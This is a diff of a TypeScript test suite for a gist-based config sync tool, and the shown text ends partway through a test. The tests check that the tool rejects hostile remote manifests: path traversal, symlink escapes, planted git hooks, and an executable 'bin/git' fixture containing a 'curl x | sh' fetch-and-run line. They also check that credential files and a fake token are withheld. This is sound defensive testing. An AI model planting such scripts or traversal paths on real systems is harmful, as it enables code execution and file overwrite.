@@ -1,8 +1,8 @@
 import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
-import { chmod, lstat, mkdir, mkdtemp, readdir, readFile, rm, symlink, writeFile } from "node:fs/promises";
+import { chmod, lstat, mkdir, mkdtemp, readdir, readFile, realpath, rm, symlink, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
-import { dirname, join } from "node:path";
+import { basename, dirname, join } from "node:path";
 import { afterEach, describe, it } from "node:test";
 import { encodePath } from "../src/codec.ts";
 import { BACKUP_DIR, CONFIG_FILE, loadConfig, loadState, saveConfig, saveState, STATE_FILE } from "../src/config.ts";
@@ -16,8 +16,11 @@ import {
   type GistClient,
   type GistSnapshot,
   type PullPlan,
+  type SyncConfig,
   type SyncEnv,
 } from "../src/types.ts";
+
+type SyncConfigRoots = SyncConfig["roots"];
 
 // ---- fixtures ---------------------------------------------------------------
 
@@ -197,6 +200,8 @@ interface Craft {
   protection?: "plain" | "encrypted";
   /** Leave the manifest entry but drop the gist file. */
   missing?: boolean;
+  /** Binary content, stored as base64. */
+  bytes?: Uint8Array;
 }
 // Writes a manifest by hand so hostile shapes the real serializer would refuse can be tested.
 function craft(fake: Fake, gistId: string, entries: Craft[], revision = 7): void {
@@ -204,16 +209,16 @@ function craft(fake: Fake, gistId: string, entries: Craft[], revision = 7): void
   const files: Record<string, string> = {};
   const manifestFiles: Record<string, unknown> = {};
   entries.forEach((e) => {
-    const content = e.content ?? "payload\n";
+    const content = e.bytes ? Buffer.from(e.bytes).toString("base64") : (e.content ?? "payload\n");
     // The gist name must be the path's own encoding or the manifest does not parse.
     const name = encodePath(e.path);
     if (!e.missing) files[name] = content;
     manifestFiles[e.path] = {
       gist: name,
-      digest: e.digest ?? sha(content),
-      size: e.size ?? Buffer.byteLength(content),
+      digest: e.digest ?? sha(e.bytes ?? content),
+      size: e.size ?? (e.bytes ? e.bytes.length : Buffer.byteLength(content)),
       mode: e.mode ?? 0o644,
-      enc: "utf8",
+      enc: e.bytes ? "base64" : "utf8",
       protection: e.protection ?? "plain",
     };
   });
@@ -1400,6 +1405,27 @@ describe("approval gate", () => {
     assert.deepEqual(res.applied, ["keybindings.json", "settings.json", "themes/dark.json"]);
   });
 
+  it("an executable theme or keybindings.json is code tier and needs approval, a plain one applies silently", async () => {
+    const entries = (mode: number): Craft[] => [
+      { path: "themes/x", content: "#!/bin/sh\nid\n", mode },
+      { path: "keybindings.json", content: "{}\n", mode },
+    ];
+    const v = await victim();
+    craft(v.fake, v.gistId, entries(0o755));
+    const plans: PullPlan[] = [];
+    await rejectsWith(pull(v.env, { confirm: async (p) => (plans.push(p), false) }), "ABORTED");
+    assert.deepEqual(plans[0]?.review.map((r) => [r.path, r.tier]), [["keybindings.json", "code"], ["themes/x", "code"]]);
+    await rejectsWith(sync.pull(v.env, {}), "ABORTED", /no confirmation handler/);
+    assert.equal(await has(v.dir, "themes/x"), false);
+    assert.equal(await has(v.dir, "keybindings.json"), false);
+
+    const w = await victim();
+    craft(w.fake, w.gistId, entries(0o644));
+    const res = await sync.pull(w.env, {});
+    assert.deepEqual(res.applied, ["keybindings.json", "themes/x"]);
+    assert.equal(await modeOf(w.dir, "themes/x"), 0o644);
+  });
+
   it("asks when settings.json changes a key that is not display-only, and names the keys", async () => {
     for (const key of ["shellCommandPrefix", "externalEditor", "skills", "prompts", "themes", "packages", "extensions", "defaultProvider", "defaultTools", "somethingNew"]) {
       const v = await victim();
@@ -1438,7 +1464,7 @@ describe("approval gate", () => {
     let calls = 0;
     const res = await pull(v.env, { dryRun: true, confirm: async () => (calls++, true) });
     assert.equal(calls, 0);
-    assert.match(res.lines.join("\n"), /Would ask before changing: extensions\/e\.ts/);
+    assert.match(res.lines.join("\n"), /Would ask before changing \(1\):\n  add extensions\/e\.ts/);
   });
 
   it("a file created while the prompt is open is backed up before it is replaced", async () => {
@@ -1748,3 +1774,601 @@ describe("status", () => {
     assert.deepEqual(await sync.scanCandidates(a.env), ["data.txt", "misc/y.txt"]);
   });
 });
+
+// ---- roots: directories outside the agent dir ---------------------------------
+
+describe("roots", () => {
+  const SCRIPT = "#!/bin/sh\necho hi\n";
+
+  interface Box extends Machine {
+    home: string;
+    bin: string;
+  }
+
+  // Temp dirs for both the agent dir and home, so `~` never means the real home.
+  async function box(fake: Fake, roots?: SyncConfigRoots, opts: { credentials?: "skip" | "encrypt"; passphrase?: string } = {}): Promise<Box> {
+    const dir = await tmp();
+    const home = await tmp();
+    const bin = join(home, ".local", "bin");
+    await mkdir(bin, { recursive: true });
+    const patch: Partial<Awaited<ReturnType<typeof loadConfig>>> = {
+      roots: roots ?? { "local-bin": { dir: "~/.local/bin", include: ["*"], exclude: [] } },
+    };
+    if (opts.credentials) patch.credentials = opts.credentials;
+    await setConfig(dir, patch);
+    return { dir, home, bin, env: { ...envFor(dir, fake, opts.passphrase), home } };
+  }
+
+  async function rootPair(opts: { credentials?: "skip" | "encrypt"; passphrase?: string } = {}) {
+    const fake = createFake();
+    const a = await box(fake, undefined, opts);
+    const { gistId } = await sync.init(a.env, {});
+    const b = await box(fake, undefined, opts);
+    await sync.init(b.env, { gistId });
+    return { fake, a, b, gistId };
+  }
+
+  const manifestOf = (fake: Fake, gistId: string) => parseManifest((fake.gists.get(gistId) as FakeData).files[MANIFEST_FILE] as string);
+
+  async function victim(roots?: SyncConfigRoots) {
+    const fake = createFake();
+    const m = await box(fake, roots);
+    const { gistId } = await sync.init(m.env, {});
+    return { fake, ...m, gistId };
+  }
+
+  it("round-trips root files with the exec bit kept and group and world write dropped", async () => {
+    const { fake, a, b, gistId } = await rootPair();
+    await put(a.bin, { piwt: SCRIPT }, 0o775);
+    await put(a.bin, { wtw: "#!/bin/sh\n" }, 0o755);
+    const pushed = await sync.push(a.env, {});
+    assert.deepEqual(pushed.added, ["@local-bin/piwt", "@local-bin/wtw"]);
+    const gist = fake.gists.get(gistId) as FakeData;
+    assert.equal(gist.files[encodePath("@local-bin/piwt")], SCRIPT);
+    assert.equal(manifestOf(fake, gistId).files["@local-bin/piwt"]?.mode, 0o775);
+
+    const plans: PullPlan[] = [];
+    const res = await sync.pull(b.env, { confirm: confirmAll(plans) });
+    assert.deepEqual(res.applied, ["@local-bin/piwt", "@local-bin/wtw"]);
+    assert.equal(await read(b.bin, "piwt"), SCRIPT);
+    assert.equal(await modeOf(b.bin, "piwt"), 0o755);
+    assert.equal(await modeOf(b.bin, "wtw"), 0o755);
+    // Nothing lands in the agent dir under the root's name.
+    assert.equal(await has(b.dir, "@local-bin"), false);
+    assert.equal(res.needsReload, false);
+    const realBin = await realpath(b.bin);
+    assert.deepEqual(
+      plans[0]?.review.map((r) => [r.path, r.action, r.tier, r.dest, r.sha256]),
+      [
+        ["@local-bin/piwt", "add", "code", join(realBin, "piwt"), sha(SCRIPT)],
+        ["@local-bin/wtw", "add", "code", join(realBin, "wtw"), sha("#!/bin/sh\n")],
+      ],
+    );
+    assert.deepEqual((await sync.status(b.env)).lines.includes("In sync."), true);
+  });
+
+  it("creates subdirectories below an existing root dir", async () => {
+    const v = await victim({ cfg: { dir: "~/.local/bin", include: ["**"], exclude: [] } });
+    craft(v.fake, v.gistId, [{ path: "@cfg/nested/deep/x.conf", content: "x=1\n" }]);
+    await pull(v.env, {});
+    assert.equal(await read(v.bin, "nested/deep/x.conf"), "x=1\n");
+  });
+
+  for (const evil of ["@local-bin/../x", "@local-bin/a/../../x", "@local-bin/./x"]) {
+    it(`rejects ${JSON.stringify(evil)} and writes nothing anywhere`, async () => {
+      const v = await victim();
+      craft(v.fake, v.gistId, [{ path: "@local-bin/ok", content: "ok\n" }, { path: "AGENTS.md", content: "ok\n" }, { path: evil }]);
+      let calls = 0;
+      await rejectsWith(pull(v.env, { confirm: async () => (calls++, true) }), "BAD_MANIFEST");
+      assert.equal(calls, 0);
+      assert.deepEqual(await onlyConfig(v.dir), [CONFIG_FILE]);
+      assert.deepEqual(await readdir(v.bin), []);
+      assert.deepEqual((await readdir(v.home)).sort(), [".local"]);
+      assert.deepEqual(await readdir(join(v.home, ".local")), ["bin"]);
+    });
+  }
+
+  it("skips unknown, wrong-case and bare root paths without writing them", async () => {
+    const v = await victim();
+    craft(v.fake, v.gistId, [
+      { path: "@Local-Bin/x", content: "evil\n" },
+      { path: "@unknown/x", content: "evil\n" },
+      { path: "@unknown/y", content: "evil\n" },
+      { path: "@local-bin/ok", content: "ok\n" },
+    ]);
+    const res = await pull(v.env, {});
+    assert.deepEqual(res.applied, ["@local-bin/ok"]);
+    assert.deepEqual(
+      res.skipped.map((s) => [s.path, s.reason, s.detail]),
+      [
+        ["@Local-Bin/x", "excluded", 'root "Local-Bin" is not configured'],
+        ["@unknown/x", "excluded", 'root "unknown" is not configured'],
+        ["@unknown/y", "excluded", 'root "unknown" is not configured'],
+      ],
+    );
+    assert.deepEqual(await readdir(v.bin), ["ok"]);
+    assert.deepEqual(await onlyConfig(v.dir), [CONFIG_FILE, STATE_FILE].sort());
+    // One hint per configurable root; an invalid name is not echoed as a command.
+    const hints = res.lines.filter((l) => l.includes("were not applied"));
+    assert.deepEqual(hints, [
+      '2 file(s) under root "unknown" were not applied. Configure it locally with: /gist-sync roots add unknown <dir> <glob...>',
+    ]);
+
+    const w = await victim();
+    craft(w.fake, w.gistId, [{ path: "@local-bin", content: "evil\n" }, { path: "AGENTS.md", content: "ok\n" }]);
+    const bare = await pull(w.env, {});
+    assert.deepEqual(bare.applied, ["AGENTS.md"]);
+    assert.deepEqual(bare.skipped.map((s) => [s.path, s.reason]), [["@local-bin", "excluded"]]);
+    assert.equal(await has(w.dir, "@local-bin"), false);
+  });
+
+  it("with no root configured, a root path is never written into the agent dir and status says how to configure it", async () => {
+    const v = await victim({});
+    await setConfig(v.dir, { include: ["**"], exclude: [] });
+    craft(v.fake, v.gistId, [{ path: "@local-bin/x", content: "evil\n" }, { path: "AGENTS.md", content: "ok\n" }]);
+    const hint = /1 file\(s\) under root "local-bin" were not applied\. Configure it locally with: \/gist-sync roots add local-bin <dir> <glob\.\.\.>/;
+    assert.match((await sync.status(v.env)).lines.join("\n"), hint);
+    const res = await pull(v.env, {});
+    assert.deepEqual(res.applied, ["AGENTS.md"]);
+    assert.match(res.lines.join("\n"), hint);
+    assert.equal(await has(v.dir, "@local-bin"), false);
+    assert.deepEqual(await readdir(v.bin), []);
+  });
+
+  describe("symlinks", { skip: process.platform === "win32" }, () => {
+    it("a symlinked file inside the root is neither replaced nor followed", async () => {
+      const v = await victim();
+      const outside = await tmp();
+      await writeFile(join(outside, "precious"), "precious\n");
+      await symlink(join(outside, "precious"), join(v.bin, "link"));
+      craft(v.fake, v.gistId, [{ path: "@local-bin/link", content: "evil\n" }, { path: "@local-bin/ok", content: "ok\n" }]);
+      const res = await pull(v.env, { force: true });
+      assert.deepEqual(res.applied, ["@local-bin/ok"]);
+      assert.equal(await readFile(join(outside, "precious"), "utf8"), "precious\n");
+      assert.equal((await lstat(join(v.bin, "link"))).isSymbolicLink(), true);
+      assert.ok(res.skipped.some((s) => s.path === "@local-bin/link" && s.reason === "symlink"));
+    });
+
+    it("a symlinked subdirectory inside the root is refused", async () => {
+      const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["**"], exclude: [] } });
+      const outside = await tmp();
+      await symlink(outside, join(v.bin, "sub"));
+      craft(v.fake, v.gistId, [{ path: "@local-bin/sub/evil", content: "evil\n" }, { path: "@local-bin/ok", content: "ok\n" }]);
+      const res = await pull(v.env, {});
+      assert.deepEqual(res.applied, ["@local-bin/ok"]);
+      assert.deepEqual(await readdir(outside), []);
+      assert.ok(res.skipped.some((s) => s.path === "@local-bin/sub/evil" && s.reason === "symlink"));
+    });
+
+    it("catches a symlinked subdirectory the root scan did not report", async () => {
+      // A probe name of "x" never matches this include, so the scanner stays silent about "sub".
+      const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["sub/evil", "ok"], exclude: [] } });
+      const outside = await tmp();
+      await symlink(outside, join(v.bin, "sub"));
+      craft(v.fake, v.gistId, [{ path: "@local-bin/sub/evil", content: "evil\n" }, { path: "@local-bin/ok", content: "ok\n" }]);
+      const res = await pull(v.env, {});
+      assert.deepEqual(res.applied, ["@local-bin/ok"]);
+      assert.deepEqual(await readdir(outside), []);
+      assert.ok(res.skipped.some((s) => s.path === "@local-bin/sub/evil" && s.reason === "symlink"));
+    });
+
+    it("a root dir that is itself a symlink to a real dir works", async () => {
+      const fake = createFake();
+      const a = await box(fake);
+      const { gistId } = await sync.init(a.env, {});
+      const b = await box(fake);
+      await sync.init(b.env, { gistId });
+      const real = await tmp();
+      await rm(b.bin, { recursive: true });
+      await symlink(real, b.bin);
+      await put(a.bin, { piwt: SCRIPT }, 0o755);
+      await sync.push(a.env, {});
+      const plans: PullPlan[] = [];
+      await sync.pull(b.env, { confirm: confirmAll(plans) });
+      assert.equal(await readFile(join(real, "piwt"), "utf8"), SCRIPT);
+      assert.equal(plans[0]?.review[0]?.dest, join(await realpath(real), "piwt"));
+    });
+  });
+
+  it("drops a root that overlaps the agent dir or equals home, with a problem line, and skips its remote files", async () => {
+    const fake = createFake();
+    const a = await box(fake);
+    const { gistId } = await sync.init(a.env, {});
+    await put(a.bin, { piwt: SCRIPT });
+    await sync.push(a.env, {});
+
+    const b = await box(fake);
+    await sync.init(b.env, { gistId });
+    await mkdir(join(b.dir, "inner"));
+    await setConfig(b.dir, {
+      roots: {
+        "local-bin": { dir: "~", include: ["*"], exclude: [] },
+        inner: { dir: join(b.dir, "inner"), include: ["*"], exclude: [] },
+      },
+    });
+    const status = await sync.status(b.env);
+    const text = status.lines.join("\n");
+    assert.match(text, /Root "inner" ignored: overlaps the agent dir/);
+    assert.match(text, /Root "local-bin" ignored: refusing the home directory/);
+    // Configured but unusable: no "configure it" hint, and nothing is behind.
+    assert.doesNotMatch(text, /were not applied/);
+    assert.deepEqual(status.behind, []);
+
+    const res = await pull(b.env, {});
+    assert.deepEqual(res.applied, []);
+    assert.deepEqual(res.skipped.map((s) => [s.path, s.detail]), [["@local-bin/piwt", 'root "local-bin" is not available']]);
+    assert.equal(await has(b.home, "piwt"), false);
+
+    const updates = fake.updates().length;
+    const pushed = await sync.push(b.env, {});
+    assert.match(pushed.lines.join("\n"), /Root "inner" ignored/);
+    assert.equal(fake.updates().length, updates);
+    assert.ok(manifestOf(fake, gistId).files["@local-bin/piwt"]);
+  });
+
+  it("a configured root whose dir is missing is never created", async () => {
+    const v = await victim({ gone: { dir: "~/nope", include: ["*"], exclude: [] } });
+    craft(v.fake, v.gistId, [{ path: "@gone/x", content: "x\n" }]);
+    const res = await pull(v.env, {});
+    assert.deepEqual(res.applied, []);
+    assert.match(res.lines.join("\n"), /Root "gone" ignored: directory does not exist/);
+    assert.equal(await has(v.home, "nope"), false);
+  });
+
+  describe("approval gate", () => {
+    it("never applies a root file silently, even one named like a safe file", async () => {
+      const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["**"], exclude: [] } });
+      craft(v.fake, v.gistId, [
+        { path: "@local-bin/keybindings.json", content: "{}\n" },
+        { path: "@local-bin/themes/t.json", content: "{}\n" },
+        { path: "@local-bin/settings.json", content: '{"theme":"dark"}\n' },
+      ]);
+      await rejectsWith(sync.pull(v.env, {}), "ABORTED", /no confirmation handler/);
+      const plans: PullPlan[] = [];
+      await rejectsWith(pull(v.env, { confirm: async (p) => (plans.push(p), false) }), "ABORTED");
+      const realBin = await realpath(v.bin);
+      assert.deepEqual(
+        plans[0]?.review.map((r) => [r.path, r.tier, r.dest]),
+        [
+          ["@local-bin/keybindings.json", "code", join(realBin, "keybindings.json")],
+          ["@local-bin/settings.json", "code", join(realBin, "settings.json")],
+          ["@local-bin/themes/t.json", "code", join(realBin, "themes", "t.json")],
+        ],
+      );
+      assert.deepEqual(await readdir(v.bin), []);
+      assert.equal(await loadState(v.dir), undefined);
+    });
+
+    it("needsReload follows the path inside the root", async () => {
+      const v = await victim({ x: { dir: "~/.local/bin", include: ["**"], exclude: [] } });
+      craft(v.fake, v.gistId, [{ path: "@x/extensions/e.ts", content: "export {};\n" }]);
+      assert.equal((await pull(v.env, {})).needsReload, true);
+    });
+  });
+
+  it("backs up an overwritten root file under @name/ and prunes with the destination shown", async () => {
+    const { a, b } = await rootPair();
+    await put(a.bin, { piwt: "new\n" });
+    await sync.push(a.env, {});
+    await put(b.bin, { piwt: "old\n" });
+    const res = await pull(b.env, { force: true });
+    assert.equal(await read(b.bin, "piwt"), "new\n");
+    assert.equal(await readFile(join(res.backupDir as string, "@local-bin", "piwt"), "utf8"), "old\n");
+    assert.ok((res.backupDir as string).startsWith(join(b.dir, BACKUP_DIR)));
+
+    await rm(join(a.bin, "piwt"));
+    await sync.push(a.env, {});
+    const plans: PullPlan[] = [];
+    const pruned = await pull(b.env, { prune: true, confirm: confirmAll(plans) });
+    assert.deepEqual(pruned.applied, ["@local-bin/piwt"]);
+    assert.deepEqual(plans[0]?.review.map((r) => [r.action, r.dest]), [["delete", join(await realpath(b.bin), "piwt")]]);
+    assert.equal(await has(b.bin, "piwt"), false);
+  });
+
+  it("skips credentials, secrets, native binaries and stale backups in a root", async () => {
+    const { fake, a, gistId } = await rootPair();
+    await put(a.bin, {
+      "deploy-token.json": '{"t":"x"}\n',
+      leaky: `#!/bin/sh\nexport GH=ghp_${"a".repeat(36)}\n`,
+      tool: new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, 0, 0]),
+      "piwt.bak-2026": SCRIPT,
+      piwt: SCRIPT,
+    });
+    const res = await sync.push(a.env, {});
+    assert.deepEqual(Object.keys(manifestOf(fake, gistId).files), ["@local-bin/piwt"]);
+    const reasons = Object.fromEntries(res.skipped.map((s) => [s.path, s.reason]));
+    assert.equal(reasons["@local-bin/deploy-token.json"], "credential");
+    assert.equal(reasons["@local-bin/leaky"], "secret-detected");
+    assert.equal(reasons["@local-bin/tool"], "native-binary");
+    assert.equal(reasons["@local-bin/piwt.bak-2026"], undefined);
+  });
+
+  it("encrypts a root credential in encrypt mode and pulls it back at 0600", async () => {
+    const { a, b } = await rootPair({ credentials: "encrypt", passphrase: "pw" });
+    await put(a.bin, { "deploy-token.json": '{"t":"x"}\n' }, 0o644);
+    await sync.push(a.env, {});
+    await pull(b.env, {});
+    assert.equal(await read(b.bin, "deploy-token.json"), '{"t":"x"}\n');
+    assert.equal(await modeOf(b.bin, "deploy-token.json"), 0o600);
+  });
+
+  it("a pull never writes portable-excluded or always-excluded names into a root", async () => {
+    const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["**"], exclude: [] } });
+    craft(v.fake, v.gistId, [
+      { path: "@local-bin/piwt.bak-2026", content: "old\n" },
+      { path: "@local-bin/.git/hooks/post-merge", content: "evil\n" },
+      { path: "@local-bin/node_modules/x.js", content: "evil\n" },
+      { path: "@local-bin/trust.json", content: "{}\n" },
+      { path: "@local-bin/ok", content: "ok\n" },
+    ]);
+    const res = await pull(v.env, {});
+    assert.deepEqual(res.applied, ["@local-bin/ok"]);
+    assert.deepEqual(await readdir(v.bin), ["ok"]);
+  });
+
+  it("a plain remote credential in a root is refused", async () => {
+    const v = await victim();
+    craft(v.fake, v.gistId, [{ path: "@local-bin/my-credentials.json", content: "{}\n" }]);
+    const res = await pull(v.env, {});
+    assert.deepEqual(res.applied, []);
+    assert.deepEqual(res.skipped.map((s) => s.reason), ["credential"]);
+  });
+
+  // Each file's credential glob names its dir, so only the root's place under home makes it a credential.
+  const CRED_ROOTS = [
+    { name: "kube", sub: ".kube", file: "config", content: "apiVersion: v1\nclusters: []\n" },
+    { name: "gh", sub: ".config/gh", file: "hosts.yml", content: "github.com:\n  user: me\n" },
+    { name: "docker", sub: ".docker", file: "config.json", content: '{"auths":{}}\n' },
+  ];
+
+  async function credBox(fake: Fake, c: (typeof CRED_ROOTS)[number], credentials: "skip" | "encrypt", passphrase?: string) {
+    const m = await box(fake, { [c.name]: { dir: `~/${c.sub}`, include: [c.file], exclude: [] } }, { credentials, passphrase });
+    const rootDir = join(m.home, ...c.sub.split("/"));
+    await mkdir(rootDir, { recursive: true });
+    return { ...m, rootDir, path: `@${c.name}/${c.file}` };
+  }
+
+  for (const c of CRED_ROOTS) {
+    it(`withholds ${c.sub}/${c.file} as a credential on push under credentials skip`, async () => {
+      const fake = createFake();
+      const m = await credBox(fake, c, "skip");
+      const { gistId } = await sync.init(m.env, {});
+      await put(m.rootDir, { [c.file]: c.content });
+      const res = await sync.push(m.env, {});
+      assert.deepEqual(res.skipped.map((s) => [s.path, s.reason]), [[m.path, "credential"]]);
+      assert.deepEqual(Object.keys(manifestOf(fake, gistId).files), []);
+    });
+
+    it(`refuses a plain remote ${c.sub}/${c.file}`, async () => {
+      const fake = createFake();
+      const m = await credBox(fake, c, "skip");
+      const { gistId } = await sync.init(m.env, {});
+      craft(fake, gistId, [{ path: m.path, content: c.content }]);
+      const res = await pull(m.env, {});
+      assert.deepEqual(res.applied, []);
+      assert.deepEqual(res.skipped.map((s) => [s.path, s.reason]), [[m.path, "credential"]]);
+      assert.equal(await has(m.rootDir, c.file), false);
+    });
+
+    it(`encrypts ${c.sub}/${c.file} under credentials encrypt and writes it back 0600`, async () => {
+      const fake = createFake();
+      const a = await credBox(fake, c, "encrypt", "pw");
+      const { gistId } = await sync.init(a.env, {});
+      const b = await credBox(fake, c, "encrypt", "pw");
+      await sync.init(b.env, { gistId });
+      await put(a.rootDir, { [c.file]: c.content }, 0o644);
+      await sync.push(a.env, {});
+      assert.equal(manifestOf(fake, gistId).files[a.path]?.protection, "encrypted");
+      await pull(b.env, {});
+      assert.equal(await read(b.rootDir, c.file), c.content);
+      assert.equal(await modeOf(b.rootDir, c.file), 0o600);
+    });
+  }
+
+  it("a file named config in a root that is not a credential dir syncs as an ordinary file", async () => {
+    const fake = createFake();
+    const m = await box(fake, { bin: { dir: "~/bin", include: ["config"], exclude: [] } }, { credentials: "skip" });
+    const { gistId } = await sync.init(m.env, {});
+    await mkdir(join(m.home, "bin"), { recursive: true });
+    await put(join(m.home, "bin"), { config: "x=1\n" });
+    const res = await sync.push(m.env, {});
+    assert.deepEqual(res.skipped, []);
+    assert.equal(manifestOf(fake, gistId).files["@bin/config"]?.protection, "plain");
+  });
+
+  it("a root settings.json is uploaded byte for byte, without the agent-dir settings merge", async () => {
+    const { fake, a, gistId } = await rootPair();
+    const text = '{"shellPath":"/bin/zsh","theme":"x"}';
+    await put(a.bin, { "settings.json": text });
+    await sync.push(a.env, {});
+    assert.equal(manifestOf(fake, gistId).files["@local-bin/settings.json"]?.digest, sha(text));
+  });
+
+  it("an @-prefixed agent-dir entry is never pushed, not even when a root has that name", async () => {
+    const fake = createFake();
+    const a = await box(fake, { weird: { dir: "~/.local/bin", include: ["*"], exclude: [] } });
+    const { gistId } = await sync.init(a.env, {});
+    await setConfig(a.dir, { include: ["**"], exclude: [] });
+    await put(a.dir, { "@weird/x": "impostor\n", "@top.md": "t\n", "AGENTS.md": "a\n" });
+    await put(a.bin, { real: "real\n" });
+    await sync.push(a.env, {});
+    const files = manifestOf(fake, gistId).files;
+    assert.deepEqual(Object.keys(files).sort(), ["@weird/real", "AGENTS.md"]);
+  });
+
+  it("status reports root files ahead and behind", async () => {
+    const { a, b } = await rootPair();
+    await put(a.bin, { piwt: SCRIPT });
+    await sync.push(a.env, {});
+    assert.deepEqual((await sync.status(b.env)).behind, ["@local-bin/piwt"]);
+    await pull(b.env, {});
+    await put(b.bin, { wtw: "w\n" });
+    const st = await sync.status(b.env);
+    assert.deepEqual([st.ahead, st.behind], [["@local-bin/wtw"], []]);
+  });
+
+  it("unlink and init keep the configured roots", async () => {
+    const { a, gistId } = await rootPair();
+    const roots = (await loadConfig(a.dir)).roots;
+    assert.deepEqual(Object.keys(roots), ["local-bin"]);
+    await sync.unlink(a.env);
+    assert.deepEqual((await loadConfig(a.dir)).roots, roots);
+    await sync.init(a.env, { gistId });
+    assert.deepEqual((await loadConfig(a.dir)).roots, roots);
+  });
+
+  it("scanCandidates lists root files the include globs do not cover", async () => {
+    const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["piwt"], exclude: [] } });
+    await put(v.bin, { piwt: SCRIPT, other: "o\n" });
+    await put(v.dir, { "data.txt": "d\n" });
+    assert.deepEqual(await sync.scanCandidates(v.env), ["@local-bin/other", "data.txt"]);
+  });
+
+  // ---- review findings: hardening -------------------------------------------------------
+
+  const ELF = new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0, ...new Array(56).fill(1)]);
+  const foldsCase = process.platform === "darwin" || process.platform === "win32";
+
+  it("an agent-dir bin/ file or any executable is code tier and is never hidden behind other changes", async () => {
+    const v = await victim();
+    const decoys = Array.from({ length: 8 }, (_, i) => ({ path: `a${i}-notes.md`, content: `# ${i}\n` }));
+    craft(v.fake, v.gistId, [
+      ...decoys,
+      { path: "bin/git", content: "#!/bin/sh\ncurl x | sh\n", mode: 0o644 },
+      { path: "skills/s/run.sh", content: "#!/bin/sh\n", mode: 0o755 },
+    ]);
+    const plans: PullPlan[] = [];
+    await pull(v.env, { confirm: confirmAll(plans) });
+    const tiers = Object.fromEntries((plans[0]?.review ?? []).map((r) => [r.path, r.tier]));
+    assert.equal(tiers["bin/git"], "code");
+    assert.equal(tiers["skills/s/run.sh"], "code");
+    assert.equal(tiers["a0-notes.md"], "other");
+  });
+
+  it("a native executable in the gist is never written, and its base is not advanced", async () => {
+    const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["*"], exclude: [] } });
+    craft(v.fake, v.gistId, [
+      { path: "@local-bin/piwt", bytes: ELF, mode: 0o755 },
+      { path: "@local-bin/ok", content: "#!/bin/sh\n", mode: 0o755 },
+    ]);
+    const res = await pull(v.env, {});
+    assert.deepEqual(res.applied, ["@local-bin/ok"]);
+    assert.deepEqual(res.skipped.filter((s) => s.reason === "native-binary").map((s) => s.path), ["@local-bin/piwt"]);
+    assert.equal(await has(v.bin, "piwt"), false);
+    assert.equal((await loadState(v.dir))?.files["@local-bin/piwt"], undefined);
+  });
+
+  it("an exclude matches every letter case where the disk ignores case", { skip: !foldsCase }, async () => {
+    const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["**"], exclude: ["ls", "private/**"] } });
+    craft(v.fake, v.gistId, [
+      { path: "@local-bin/LS", content: "#!/bin/sh\necho PWNED\n", mode: 0o755 },
+      { path: "@local-bin/PRIVATE/planted", content: "x\n" },
+      { path: "bin/RG", content: "#!/bin/sh\n", mode: 0o755 },
+    ]);
+    const res = await pull(v.env, {});
+    assert.deepEqual(res.applied, []);
+    assert.deepEqual(await readdir(v.bin), []);
+    assert.equal(await has(v.dir, "bin"), false);
+    // Push side: a local case variant of an excluded name is not uploaded either.
+    await put(v.bin, { LS: "#!/bin/sh\n" });
+    await put(v.dir, { "bin/RG": "#!/bin/sh\n" });
+    const pushed = await sync.push(v.env, { dryRun: true });
+    assert.deepEqual(pushed.added, []);
+  });
+
+  it("refuses roots reached through a firmlink alias of home or the agent dir", { skip: process.platform !== "darwin" }, async () => {
+    const v = await victim();
+    const aliasOf = async (p: string) => join("/System/Volumes/Data", await realpath(p));
+    try {
+      await lstat(await aliasOf(v.dir));
+    } catch {
+      return; // no data-volume firmlink for this temp dir
+    }
+    await setConfig(v.dir, {
+      roots: {
+        home: { dir: await aliasOf(v.home), include: ["**"], exclude: [] },
+        agent: { dir: await aliasOf(v.dir), include: ["**"], exclude: [] },
+        volume: { dir: "/System/Volumes/Data", include: ["**"], exclude: [] },
+      },
+    });
+    const before = await readFile(join(v.dir, CONFIG_FILE), "utf8");
+    craft(v.fake, v.gistId, [{ path: `@agent/${CONFIG_FILE}`, content: "{}\n" }, { path: "@home/.local/bin/x", content: "x\n" }]);
+    const res = await pull(v.env, { force: true });
+    assert.deepEqual(res.applied, []);
+    const text = res.lines.join("\n");
+    assert.match(text, /Root "agent" ignored: overlaps the agent dir/);
+    assert.match(text, /Root "home" ignored: refusing the home directory/);
+    assert.match(text, /Root "volume" ignored: refusing the home directory/);
+    assert.equal(await readFile(join(v.dir, CONFIG_FILE), "utf8"), before);
+    assert.deepEqual(await readdir(v.bin), []);
+  });
+
+  it("refuses a write when a parent of the root dir was swapped for a symlink while the prompt was open", async () => {
+    const v = await victim();
+    const elsewhere = join(v.home, "elsewhere");
+    await mkdir(join(elsewhere, "bin"), { recursive: true });
+    craft(v.fake, v.gistId, [{ path: "@local-bin/piwt", content: SCRIPT, mode: 0o755 }]);
+    const swap = async () => {
+      await rm(join(v.home, ".local"), { recursive: true });
+      await symlink(elsewhere, join(v.home, ".local"));
+      return true;
+    };
+    await rejectsWith(sync.pull(v.env, { confirm: swap }), "BAD_MANIFEST", /root dir changed/);
+    assert.deepEqual(await readdir(join(elsewhere, "bin")), []);
+  });
+
+  it("refuses a push that would take the gist past 300 files, before any write", async () => {
+    const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["*"], exclude: [] } });
+    craft(v.fake, v.gistId, Array.from({ length: 250 }, (_, i) => ({ path: `@other/f${i}`, content: `${i}\n` })), 0);
+    await put(v.bin, Object.fromEntries(Array.from({ length: 60 }, (_, i) => [`s${i}`, `#!/bin/sh\n# ${i}\n`])));
+    const updates = v.fake.updates().length;
+    await rejectsWith(sync.push(v.env, {}), "TOO_MANY_FILES", /310 files/);
+    assert.equal(v.fake.updates().length, updates);
+  });
+
+  it("rejects a manifest with two names that differ only in Unicode normal form", async () => {
+    const v = await victim({ "local-bin": { dir: "~/.local/bin", include: ["*"], exclude: [] } });
+    craft(v.fake, v.gistId, [
+      { path: "@local-bin/caf\u00e9", content: "a\n" },
+      { path: "@local-bin/cafe\u0301", content: "b\n" },
+    ]);
